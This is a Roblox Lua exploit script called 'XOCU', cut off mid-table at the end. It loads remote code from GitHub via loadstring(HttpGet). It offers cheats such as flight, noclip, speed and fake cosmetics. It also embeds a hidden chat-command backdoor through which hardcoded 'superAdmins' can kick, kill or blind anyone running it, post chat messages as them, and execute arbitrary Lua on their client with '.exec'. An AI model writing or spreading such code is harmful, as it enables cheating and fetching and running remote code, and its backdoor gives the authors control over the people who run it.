-- XOCU
game.Players.LocalPlayer.PlayerScripts.CharacterAndBeamMove.Enabled = false
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/iavichbest/XOCU/refs/heads/main/idk"))()

Players = game:GetService('Players')
TweenService = game:GetService('TweenService')
plr = Players.LocalPlayer
gui = plr:WaitForChild('PlayerGui'):WaitForChild('MenuGui')
TopRight = gui:WaitForChild('TopRight')
CoinsFrame = TopRight:WaitForChild('CoinsFrame')
CoinsDisplay = CoinsFrame:WaitForChild('CoinsDisplay')
CoinImage = CoinsDisplay:WaitForChild('CoinImage')
Coins = CoinsDisplay:WaitForChild('Coins')
CoinsButton = CoinsFrame:WaitForChild('CoinsButton')

for _, v in ipairs(CoinsFrame:GetChildren())do
    if v:IsA('UICorner') or v:IsA('UIStroke') or v:IsA('UIPadding') or v:IsA('UIGradient') then
        v:Destroy()
    end
end
for _, v in ipairs(CoinsDisplay:GetChildren())do
    if v:IsA('UIListLayout') then
        v:Destroy()
    end
end

blur = Instance.new('ImageLabel')
blur.Name = 'GlassBlur'
blur.BackgroundTransparency = 1
blur.Size = UDim2.new(1, 0, 1, 0)
blur.Position = UDim2.new(0, 0, 0, 0)
blur.Image = 'rbxassetid://8992230677'
blur.ImageTransparency = 0.88
blur.ScaleType = Enum.ScaleType.Stretch
blur.ZIndex = CoinsFrame.ZIndex - 1
blur.Parent = CoinsFrame
CoinsFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
CoinsFrame.BackgroundTransparency = 0.35
CoinsFrame.AutomaticSize = Enum.AutomaticSize.X
CoinsFrame.Size = UDim2.new(0, 0, 0, 74)
corner = Instance.new('UICorner')
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = CoinsFrame
padding = Instance.new('UIPadding')
padding.PaddingLeft = UDim.new(0, 10)
padding.PaddingRight = UDim.new(0, 10)
padding.Parent = CoinsFrame
stroke = Instance.new('UIStroke')
stroke.Thickness = 1
stroke.Transparency = 0.6
stroke.Color = Color3.fromRGB(135, 206, 235)
stroke.Parent = CoinsFrame
borderGrad = Instance.new('UIGradient')
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
borderGrad.Parent = stroke

task.spawn(function()
    while CoinsFrame.Parent do
        for i = 0, 360, 1 do
            borderGrad.Rotation = i

            task.wait(0.02)
        end
    end
end)
TweenService:Create(CoinsFrame, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.25}):Play()

CoinsDisplay.BackgroundTransparency = 1
CoinsDisplay.AutomaticSize = Enum.AutomaticSize.X
CoinsDisplay.Size = UDim2.new(0, 0, 1, 0)

local layout = Instance.new('UIListLayout')

layout.FillDirection = Enum.FillDirection.Horizontal
layout.VerticalAlignment = Enum.VerticalAlignment.Center
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = CoinsDisplay
Coins.LayoutOrder = 1
Coins.BackgroundTransparency = 1
Coins.AutomaticSize = Enum.AutomaticSize.X
Coins.TextXAlignment = Enum.TextXAlignment.Left
Coins.TextYAlignment = Enum.TextYAlignment.Center
Coins.Font = Enum.Font.GothamBold
Coins.TextSize = 34
Coins.Text = tostring(Coins.Text)

local textGrad = Instance.new('UIGradient')

textGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
textGrad.Parent = Coins

task.spawn(function()
    while Coins.Parent do
        for i = 0, 360, 2 do
            textGrad.Rotation = i

            task.wait(0.03)
        end
    end
end)

CoinImage.LayoutOrder = 2
CoinImage.BackgroundTransparency = 1
CoinImage.Size = UDim2.new(0, 64, 0, 64)
CoinImage.ImageColor3 = Color3.fromRGB(135, 206, 235)
CoinImage.AnchorPoint = Vector2.new(0, 0.5)
CoinImage.Position = UDim2.new(0, 0, 0.5, 0)

task.defer(function()
    CoinImage.Image = 'rbxassetid://6031094678'
end)
TweenService:Create(CoinImage, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    Position = CoinImage.Position + UDim2.new(0, 0, 0, -4),
}):Play()

CoinsButton.BackgroundTransparency = 1
CoinsButton.Text = ''
CoinsButton.Size = UDim2.new(1, 0, 1, 0)
CoinsButton.ZIndex = CoinsFrame.ZIndex + 5

function tween(obj, ti, props)
    TweenService:Create(obj, ti, props):Play()
end

CoinsButton.MouseEnter:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.15})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseLeave:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.6})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseButton1Down:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.08), {
        Size = UDim2.new(0, 0, 0, 71),
    })
end)
CoinsButton.MouseButton1Up:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 0, 0, 74),
    })
end)

Players = game:GetService('Players')
RunService = game:GetService('RunService')
TextChatService = game:GetService('TextChatService')
LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
RBXGeneral = TextChatService.TextChannels:FindFirstChild('RBXGeneral')
scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

local superAdmins = {
    kshopnakub_2271 = true,
    MNHET_XOCU = true,
    gpoikhfgy = true,
}
local admins = {}
local tempAdmins = {}

function sendLines(player, lines, perMessage)
    perMessage = perMessage or 4

    for i = 1, #lines, perMessage do
        local chunk = {}

        for j = i, math.min(i + perMessage - 1, #lines)do
            table.insert(chunk, lines[j])
        end

        local text = table.concat(chunk, '\n')

        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
        task.wait(0.25)
    end
end

local commandHelp = {
    '.chat (Target) (Text)',
    '.bring (Target)',
    '.kill (Target)',
    '.kick (Target)',
    '.freeze (Target)',
    '.thaw (Target)',
    '.spin (Target)',
    '.unspin',
    '.fps (Target) (Cap)',
    '.friend (Target)',
    '.unfriend (Target)',
    '.admin (Target)',
    '.revoke (Target)',
    '.exec (Target) (Code)',
    '.reveal (Target) (All)',
    '.credits',
    '.blind (Target)',
    '.cmds',
}
local frozenPlayers = {}

function getRole(name)
    if superAdmins[name] then
        return 'superadmin'
    elseif admins[name] or tempAdmins[name] then
        return 'admin'
    else
        return 'user'
    end
end
function resolveTargets(input)
    if not input then
        return {}
    end

    input = input:lower()

    local results = {}

    if input == 'all' then
        for player in pairs(scriptedPlayers)do
            table.insert(results, player)
        end

        return results
    end

    for _, plr in ipairs(Players:GetPlayers())do
        local uname = plr.Name:lower()
        local dname = (plr.DisplayName or ''):lower()

        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end

    return results
end
function toggleBlock(player, enable)
    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end
    if enable then
        if not hrp:FindFirstChild('Block') then
            local bv = Instance.new('BodyVelocity')

            bv.Name = 'Block'
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        local bv = hrp:FindFirstChild('Block')

        if bv then
            bv:Destroy()
        end
    end
end
function freezePlayer(player, enable)
    if not scriptedPlayers[player] then
        return
    end

    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        hrp.Anchored = enable
    end
end

local spin = false
local spinTarget = nil

function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end
function handleMessage(sender, text)
    local senderRole = getRole(sender.Name)

    if senderRole == 'user' then
        return
    end

    local args = {}

    for word in text:gmatch('%S+')do
        table.insert(args, word)
    end

    if #args < 1 then
        return
    end

    local cmd = args[1]:lower()
    local targets = resolveTargets(args[2])

    if cmd == '.chat' then
        local msg = table.concat(args, ' ', 3)

        if msg ~= '' then
            for _, target in ipairs(targets)do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end
    elseif cmd == '.kick' then
        local reason = table.concat(args, ' ', 3)

        if reason == '' then
            reason = 'No Reason was applied.'
        end

        for _, target in ipairs(targets)do
            local message = 'Kicked by: ' .. sender.DisplayName .. ' (@' .. sender.Name .. ')\n' .. 'Reason: ' .. reason

            target:Kick(message)
        end
    elseif cmd == '.wither' then
        witheringheights()
    elseif cmd == '.kill' then
        for _, target in ipairs(targets)do
            local hum = target.Character and target.Character:FindFirstChildOfClass('Humanoid')

            if hum then
                hum.Health = 0
            end
        end
    elseif cmd == '.bring' then
        for _, target in ipairs(targets)do
            local hrp = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
            local senderHRP = sender.Character and sender.Character:FindFirstChild('HumanoidRootPart')

            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)

                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end
    elseif cmd == '.spin' then
        spin = true
        spinTarget = targets[1]
    elseif cmd == '.unspin' then
        spin = false
        spinTarget = nil
    elseif cmd == '.fps' then
        local cap = tonumber(args[3])

        if cap and setfpscap then
            setfpscap(cap)
        end
    elseif cmd == '.fling' then
        for _, target in ipairs(targets)do
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            local tHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')

            if myHRP and tHRP then
                myHRP.CFrame = tHRP.CFrame

                task.wait()

                myHRP.Velocity = Vector3.new(9999, 9999, 9999)
            end
        end
    elseif cmd == '.freeze' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = true

            freezePlayer(target, true)
        end
    elseif cmd == '.thaw' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = nil

            freezePlayer(target, false)
        end
    elseif cmd == '.friend' then
        for _, target in ipairs(targets)do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat('friended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.unfriend' then
        for _, target in ipairs(targets)do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat('unfriended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.admin' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if target and not superAdmins[target.Name] then
                tempAdmins[target.Name] = true

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is now whitelisted')
            end
        end
    elseif cmd == '.revoke' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if tempAdmins[target.Name] then
                tempAdmins[target.Name] = nil

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is no longer whitelisted')
            end
        end
    elseif cmd == '.exec' then
        if senderRole ~= 'superadmin' then
            return
        end

        local code = table.concat(args, ' ', 3)

        if code ~= '' and targets[1] == LocalPlayer then
            local fn, err = loadstring(code)

            if fn then
                pcall(fn)
            else
                warn(err)
            end
        end
    elseif cmd == '.cmds' then
        local chunkSize = 4

        for i = 1, #commandHelp, chunkSize do
            local chunk = {}

            for j = i, math.min(i + chunkSize - 1, #commandHelp)do
                table.insert(chunk, commandHelp[j])
            end

            sendToChat(table.concat(chunk, '\n'))
            task.wait(0.25)
        end
    elseif cmd == '.reveal' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('XOCU TUFF')
            end
        end
    elseif cmd == '.blind' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                local gui = Instance.new('ScreenGui', game.CoreGui)
                local frame = Instance.new('Frame', gui)

                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)

                task.delay(5, function()
                    gui:Destroy()
                end)
            end
        end
    elseif cmd == '.credits' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('CREDITS: Made by XOCU and 9rr')
            end
        end
    end
end
function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers())do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)
RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then
        return
    end

    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild('HumanoidRootPart')

    if hrp and targetHRP then
        local a = tick() * 2

        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

-- Global state storage
local ToggleStates = {}
function SetToggleState(flag, value) ToggleStates[flag] = value end
function GetToggleState(flag) return ToggleStates[flag] or false end

local Options = Library.Items or Library.Flags or {}
local Toggles = Library.Flags or Library.Items or {}
local Window = Library:CreateWindow({
	Title = "XOCU",
    Theme = {
        Font = "SciFi",
        ImageTransparency = 5,
        BGTransparency = 100,
        BackgroundID = "131726780467000",
        Main = Color3.fromRGB(8, 10, 15),
        Second = Color3.fromRGB(1, 7, 32),
        ElementAccent = Color3.fromRGB(69, 28, 28),
        TextColor = Color3.fromRGB(124, 122, 255),
        GradientStart = Color3.fromRGB(86, 120, 249),
        GradientEnd = Color3.fromRGB(0, 255, 0),
        CornerRadius = 12,
        HudTransparency = 25
    },
	ToggleKey = Enum.KeyCode.RightShift,
	Transparency = 0.25,
	ShowWatermark = {Enabled = true, Title = true, User = true, FPS = true, Duration = false, Ping = true},
	AutoSave = true,
	ConfigFolder = "XOCU_Config",
    UiScale = 1.0,
    CustomIcon = "82269833034303"
})
local Tabs = {
    Main = Window:CreateTab("Main", true, "6023426915"),
	Defense = Window:CreateTab("Defense", true, "96097489556461"),
	Target = Window:CreateTab("Target", true, "10360632826"),
	Grab = Window:CreateTab("Grab", true, "17313314020"), 
	Player = Window:CreateTab("Player", true, "2795572803"),
    Server = Window:CreateTab("Server", true, "6023426925"),
    Toy = Window:CreateTab("Toys", true, "9682067800"),
	Misc = Window:CreateTab("Misc", true, "114167292947807"), 
    Figure = Window:CreateTab("Figure", true, "10826661578"),
	Keybinds = Window:CreateTab("Keybinds", true, "11710306257"), 
	Visuals  = Window:CreateTab("Visuals",  true, "112488114197106"),
}
local MainV = Tabs.Main:CreateBlock({Name = "Value", true, Side = "Left"})
local MainL = Tabs.Main:CreateBlock({Name = "Main", true, Side = "Left"})
local MainR = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})
local SoundGroup = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})


local spinningConnection = nil
local spinSpeed = 5

local PL_SpeedEnabled = false
local PL_SpeedValue = 16
local PL_SpeedConn = nil

local jpEnabled = false
local jpValue = 50
local jpConn = nil

local infJumpEnabled = false
local noclipEnabled = false
local noclipConnection = nil

MainL:CreateToggle({
    Name = "Spin Character",
    Flag = "Spin Character",
    Default = false,
    Callback = function(Value)
        SetToggleState("Spin Character", Value)
        if Value then
            spinningConnection = R.Heartbeat:Connect(function()
                local character = Player.Character
                local root = character and character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                end
            end)
        else
            if spinningConnection then
                spinningConnection:Disconnect()
                spinningConnection = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = "Spin Speed",
    Flag = "Spin Speed",
    Default = 5,
    Min = 1,
    Max = 50,
    Callback = function(Value)
        spinSpeed = Value
    end
})

MainL:CreateToggle({
    Name = "Walkspeed",
    Flag = "Walkspeed",
    Default = false,
    Callback = function(Value)
        SetToggleState("Walkspeed", Value)
        PL_SpeedEnabled = Value
        if Value then
            if PL_SpeedConn then PL_SpeedConn:Disconnect() end
            PL_SpeedConn = RunService.RenderStepped:Connect(function()
                if not PL_SpeedEnabled then return end
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChild("Humanoid")
                if hrp and hum then
                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * (PL_SpeedValue * 0.1)
                end
            end)
        else
            if PL_SpeedConn then
                PL_SpeedConn:Disconnect()
                PL_SpeedConn = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = "Walk Speed",
    Flag = "Walk Speed",
    Default = 16,
    Min = 1,
    Max = 1000,
    Callback = function(Value)
        PL_SpeedValue = Value
    end
})

MainL:CreateToggle({
    Name = "Jump Power",
    Flag = "Jump Power",
    Default = false,
    Callback = function(Value)
        SetToggleState("Jump Power", Value)
        jpEnabled = Value
        if Value then
            if jpConn then jpConn:Disconnect() end
            jpConn = RunService.Heartbeat:Connect(function()
                if not jpEnabled then return end
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChild("Humanoid")
                if hum then
                    hum.JumpPower = jpValue
                end
            end)
        else
            if jpConn then
                jpConn:Disconnect()
                jpConn = nil
            end
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum then
                hum.JumpPower = 50
            end
        end
    end
})

MainV:CreateSlider({
    Name = "Jump Power Value",
    Flag = "Jump Power Value",
    Default = 50,
    Min = 1,
    Max = 1000,
    Callback = function(Value)
        jpValue = Value
        if jpEnabled then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum then
                hum.JumpPower = jpValue
            end
        end
    end
})

do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    
    local plr = Players.LocalPlayer
    local cons = cons or {}

    local FlightSettings = {
        Enabled = false,
        Speed = 50,
        BodyVelocity = nil,
        BodyGyro = nil,
        FlightConnection = nil,
        CurrentVelocity = Vector3.new(0, 0, 0),
        IsInVehicle = false,
    }

    local function cleanupFlight()
        if FlightSettings.FlightConnection then
            FlightSettings.FlightConnection:Disconnect()
            FlightSettings.FlightConnection = nil
        end
        
        if FlightSettings.BodyVelocity then
            FlightSettings.BodyVelocity:Destroy()
            FlightSettings.BodyVelocity = nil
        end
        
        if FlightSettings.BodyGyro then
            FlightSettings.BodyGyro:Destroy()
            FlightSettings.BodyGyro = nil
        end
        
        local char = plr.Character
        if char then
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid and not FlightSettings.IsInVehicle then
                humanoid.PlatformStand = false
            end
        end
    end

    local function getFlightTarget()
        local char = plr.Character
        if not char then return nil end
        
        local humanoid = char:FindFirstChild("Humanoid")
        if not humanoid then return nil end
        
        if humanoid.Sit then
            FlightSettings.IsInVehicle = true
            local seat = humanoid.SeatPart
            if seat and seat.Parent then
                return seat.Parent:FindFirstChild("HumanoidRootPart") or seat
            end
        end
        
        FlightSettings.IsInVehicle = false
        return char:FindFirstChild("HumanoidRootPart")
    end

    local function applyFlightPhysics()
        local targetPart = getFlightTarget()
        if not targetPart then return end
        
        cleanupFlight()
        
        FlightSettings.BodyVelocity = Instance.new("BodyVelocity")
        FlightSettings.BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        FlightSettings.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
        FlightSettings.BodyVelocity.P = 10000
        FlightSettings.BodyVelocity.Parent = targetPart
        
        FlightSettings.BodyGyro = Instance.new("BodyGyro")
        FlightSettings.BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        FlightSettings.BodyGyro.CFrame = targetPart.CFrame
        FlightSettings.BodyGyro.P = 10000
        FlightSettings.BodyGyro.Parent = targetPart
        
        local char = plr.Character
        if char then
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid and not FlightSettings.IsInVehicle then
                humanoid.PlatformStand = true
            end
        end
        
        FlightSettings.CurrentVelocity = Vector3.new(0, 0, 0)
        
        FlightSettings.FlightConnection = RunService.Heartbeat:Connect(function()
            if not FlightSettings.Enabled then
                cleanupFlight()
                return
            end
            
            local currentTarget = getFlightTarget()
            if not currentTarget or not currentTarget.Parent then
                return
            end
            
            if FlightSettings.BodyVelocity and FlightSettings.BodyVelocity.Parent ~= currentTarget then
                applyFlightPhysics()
                return
            end
            
            local moveDir = Vector3.new(0, 0, 0)
            local Camera = workspace.CurrentCamera
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
            
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit
            end
            
            local targetVelocity = moveDir * FlightSettings.Speed
            FlightSettings.CurrentVelocity = FlightSettings.CurrentVelocity:Lerp(targetVelocity, 0.2)
            
            if FlightSettings.BodyVelocity then
                FlightSettings.BodyVelocity.Velocity = FlightSettings.CurrentVelocity
            end
            
            if FlightSettings.BodyGyro then
                FlightSettings.BodyGyro.CFrame = Camera.CFrame
            end
        end)
    end

    local function setFlightState(state)
        FlightSettings.Enabled = state
        if not state then
            cleanupFlight()
        else
            applyFlightPhysics()
        end
    end

    if cons["FlightRespawn"] then cons["FlightRespawn"]:Disconnect() end
    cons["FlightRespawn"] = plr.CharacterAdded:Connect(function(char)
        if FlightSettings.Enabled then
            char:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            if FlightSettings.Enabled then
                applyFlightPhysics()
            end
        end
    end)

    MainL:CreateToggle({
        Name = "Flight",
        Flag = "FlyToggle",
        Default = false,
        Callback = function(v)
            setFlightState(v)
        end
    })

    MainV:CreateSlider({
        Name = "Flight Speed",
        Flag = "FlySpeed",
        Min = 50,
        Max = 10000,
        Default = 200,
        Callback = function(v)
            FlightSettings.Speed = v
        end
    })
end

MainL:CreateToggle({
    Name = "Water Walk",
    Flag = "Water Walk",
    Default = false,
    Callback = function(v)
        SetToggleState("Water Walk", v)
        for i, vv in pairs(workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel:GetChildren()) do
            if vv.Name == "Ocean" then
                vv.CanCollide = v
            end
        end
    end
})

MainL:CreateToggle({
    Name = "Noclip",
    Flag = "Noclip",
    Default = false,
    Callback = function(Value)
        noclipEnabled = Value
        if noclipConnection then
            noclipConnection:Disconnect()
            noclipConnection = nil
        end
        if Value then
            noclipConnection = RunService.Stepped:Connect(function()
                local char = LocalPlayer.Character
                if char then
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        end
    end
})

MainL:CreateToggle({
    Name = "Inf Jump",
    Flag = "Inf Jump",
    Default = false,
    Callback = function(Value)
        infJumpEnabled = Value
    end
})

UserInputService.JumpRequest:Connect(function()
    if infJumpEnabled then
        local char = LocalPlayer.Character
        local humanoid = char and char:FindFirstChild("Humanoid")
        if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

do

    local FakeCosmeticsEnabled = false
    local RespawnPersist = false
    local CosmeticChoice = "Both"

    local KORBLOX_MESH_ID = "101851696"
    local KORBLOX_TEX_ID = "101851254"
    local HEADLESS_MESH_ID = "134082579"
    local HEADLESS_TEX_ID = "134082627"

    local SavedHeadData = nil

    local function SnapshotHead()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        SavedHeadData = {
            Transparency = head.Transparency,
            BrickColor = head.BrickColor,
            Material = head.Material,
            Meshes = {},
            Decals = {},
        }
        for _, obj in ipairs(head:GetChildren()) do
            if obj:IsA("SpecialMesh") then
                table.insert(SavedHeadData.Meshes, {
                    MeshType = obj.MeshType,
                    MeshId = obj.MeshId,
                    TextureId = obj.TextureId,
                    Scale = obj.Scale,
                    Offset = obj.Offset,
                    VertexColor = obj.VertexColor,
                    Name = obj.Name,
                })
            elseif obj:IsA("Decal") then
                table.insert(SavedHeadData.Decals, {
                    Texture = obj.Texture,
                    Face = obj.Face,
                    Transparency = obj.Transparency,
                    Name = obj.Name,
                })
            end
        end
    end

    local function WearHeadless()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        SnapshotHead()
        for _, obj in ipairs(head:GetChildren()) do
            if obj:IsA("Decal") or obj:IsA("SpecialMesh") then obj:Destroy() end
        end
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = "rbxassetid://" .. HEADLESS_MESH_ID
        mesh.TextureId = "rbxassetid://" .. HEADLESS_TEX_ID
        mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
        mesh.Name = "PhantomHeadlessMesh"
        mesh.Parent = head
        head.Transparency = 0.1
        head.BrickColor = BrickColor.new("Really black")
        head.Material = Enum.Material.Plastic
    end

    local function WearKorblox()
        local char = LocalPlayer.Character
        if not char then return end
        local rleg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
        if not rleg then return end
        local old = char:FindFirstChild("PhantomKorbloxLeg")
        if old then old:Destroy() end
        local fakeLeg = Instance.new("Part")
        fakeLeg.Name = "PhantomKorbloxLeg"
        fakeLeg.Size = rleg.Size
        fakeLeg.CFrame = rleg.CFrame
        fakeLeg.Anchored = false
        fakeLeg.CanCollide = false
        fakeLeg.Transparency = 0
        fakeLeg.BrickColor = BrickColor.new("Really black")
        fakeLeg.Material = Enum.Material.Plastic
        fakeLeg.Parent = char
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = "rbxassetid://" .. KORBLOX_MESH_ID
        mesh.TextureId = "rbxassetid://" .. KORBLOX_TEX_ID
        mesh.Scale = Vector3.new(1, 1, 1)
        mesh.Parent = fakeLeg
        local weld = Instance.new("WeldConstraint")
        weld.Part0 = rleg
        weld.Part1 = fakeLeg
        weld.Parent = rleg
        rleg.Transparency = 1
    end

    local function ApplyCosmetics()
        local char = LocalPlayer.Character
        if not char then return end
        if CosmeticChoice == "Headless" then WearHeadless()
        elseif CosmeticChoice == "Korblox" then WearKorblox()
        elseif CosmeticChoice == "Both" then WearHeadless() WearKorblox() end
    end

    local function StripCosmetics()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if head then
            local m = head:FindFirstChild("PhantomHeadlessMesh")
            if m then m:Destroy() end
            if SavedHeadData then
                head.Transparency = SavedHeadData.Transparency
                head.BrickColor = SavedHeadData.BrickColor
                head.Material = SavedHeadData.Material
                for _, m2 in ipairs(SavedHeadData.Meshes) do
                    local mesh = Instance.new("SpecialMesh")
                    mesh.MeshType = m2.MeshType
                    mesh.MeshId = m2.MeshId
                    mesh.TextureId = m2.TextureId
                    mesh.Scale = m2.Scale
                    mesh.Offset = m2.Offset
                    mesh.VertexColor = m2.VertexColor
                    mesh.Name = m2.Name
                    mesh.Parent = head
                end
                for _, d in ipairs(SavedHeadData.Decals) do
                    local decal = Instance.new("Decal")
                    decal.Texture = d.Texture
                    decal.Face = d.Face
                    decal.Transparency = d.Transparency
                    decal.Name = d.Name
                    decal.Parent = head
                end
                SavedHeadData = nil
            else
                head.Transparency = 0
            end
        end
        local rleg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
        if rleg then
            rleg.Transparency = 0
            local w = rleg:FindFirstChildOfClass("WeldConstraint")
            if w then w:Destroy() end
        end
        local fakeleg = char:FindFirstChild("PhantomKorbloxLeg")
        if fakeleg then fakeleg:Destroy() end
    end

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        SavedHeadData = nil
        if FakeCosmeticsEnabled and RespawnPersist then ApplyCosmetics() end
    end)

    MainR:CreateToggle({
        Name = "Enable Cosmetics",
        Default = false,
        Callback = function(v)
            FakeCosmeticsEnabled = v
            if v then
                ApplyCosmetics()
            else
                StripCosmetics()
            end
        end
    })

    MainR:CreateDropdown({
        Name = "Style",
        Items = {"Headless", "Korblox", "Both"},
        Default = "Both",
        Callback = function(v)
            CosmeticChoice = v
            if FakeCosmeticsEnabled then StripCosmetics() ApplyCosmetics() end
        end
    })

    MainR:CreateToggle({
        Name = "Re-apply on Respawn",
        Default = false,
        Callback = function(v)
            RespawnPersist = v
        end
    })
end

do

    local Players = game:GetService('Players')
    local UserInputService = game:GetService('UserInputService')
    local SoundService = game:GetService('SoundService')
    local TextChatService = game:GetService('TextChatService')
    local player = Players.LocalPlayer

    local soundMap = {
        ['Normal Typing'] = 'rbxassetid://72486459002567',
